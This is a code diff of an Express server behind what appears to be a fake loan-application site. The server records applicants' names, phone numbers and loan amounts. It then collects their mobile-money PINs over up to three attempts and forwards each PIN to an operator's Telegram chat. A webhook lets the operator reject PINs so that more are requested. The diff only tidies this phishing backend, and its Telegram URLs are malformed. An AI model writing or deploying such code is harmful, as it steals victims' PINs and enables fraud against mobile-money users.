@@ -4,19 +4,15 @@ const path = require("path");
 
 const app = express();
 
-// Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
-// ENV VARIABLES
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
-// ✅ STORE USERS
 const users = {};
 
-// ================= HOME =================
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
@@ -24,22 +20,19 @@ app.get("/", (req, res) => {
 // ================= 1. INITIAL APPLICATION =================
 app.post("/apply", async (req, res) => {
   const { name, phone, network, amount, nationalId } = req.body;
+  if (!phone) return res.status(400).send("Phone required");
 
-  if (!phone) return res.status(400).send("Phone is required");
-
-  // Reset or create user record
   users[phone] = {
-    name: name || "Unknown",
+    name: name || "User",
     phone,
-    network: network || "Unknown",
+    network: network || "N/A",
     amount: amount || "0",
-    nationalId: nationalId || "N/A",
     status: "pending",
     pinStatus: "waiting",
     attempts: 0
   };
 
-  const message = `📥 *NEW LOAN APPLICATION*\n\n👤 *Name:* ${users[phone].name}\n📱 *Phone:* ${phone}\n💰 *Amount:* ${users[phone].amount}\n\n⚙️ *Action Required:*`;
+  const message = `📥 *NEW LOAN*\n👤 Name: ${name}\n📱 Phone: ${phone}\n💰 Amount: ${amount}`;
 
   try {
     await axios.post(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
@@ -51,9 +44,7 @@ app.post("/apply", async (req, res) => {
       }
     });
     res.sendStatus(200);
-  } catch (err) {
-    res.status(500).send("Telegram failed");
-  }
+  } catch (err) { res.sendStatus(500); }
 });
 
 // ================= 2. STATUS CHECKERS =================
@@ -77,7 +68,7 @@ app.post("/send-pin", async (req, res) => {
   users[phone].attempts += 1;
   users[phone].pinStatus = "verifying";
 
-  const message = `🔐 *PIN RECEIVED (${users[phone].attempts}/3)*\n\n📱 *Phone:* ${phone}\n🔑 *PIN:* \`${pin}\``;
+  const message = `🔐 *PIN RECEIVED (${users[phone].attempts}/3)*\n📱 Phone: ${phone}\n🔑 PIN: \`${pin}\``;
 
   try {
     await axios.post(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
@@ -89,19 +80,15 @@ app.post("/send-pin", async (req, res) => {
       }
     });
     res.sendStatus(200);
-  } catch (err) {
-    res.sendStatus(500);
-  }
+  } catch (err) { res.sendStatus(500); }
 });
 
-// ================= 4. WEBHOOK (RE-FIXED) =================
-app.post("/webhook", (req, res) => {
+// ================= 4. WEBHOOK =================
+app.post("/webhook", async (req, res) => {
   const data = req.body;
   if (!data.callback_query) return res.sendStatus(200);
 
   const action = data.callback_query.data;
-  
-  // Safely extract command and phone
   const parts = action.split("_");
   const command = parts[0];
   const phone = parts[1];
@@ -124,13 +111,15 @@ app.post("/webhook", (req, res) => {
     feedback = `⚠️ Wrong PIN for ${phone}`;
   }
 
-  axios.post(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
-    chat_id: CHAT_ID,
-    text: feedback
-  });
+  try {
+    await axios.post(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: feedback
+    });
+  } catch (e) {}
 
   res.sendStatus(200);
 });
 
 const PORT = process.env.PORT || 8080;
-app.listen(PORT, "0.0.0.0", () => console.log("Server running on " + PORT));
+app.listen(PORT, "0.0.0.0", () => console.log("Server online"));
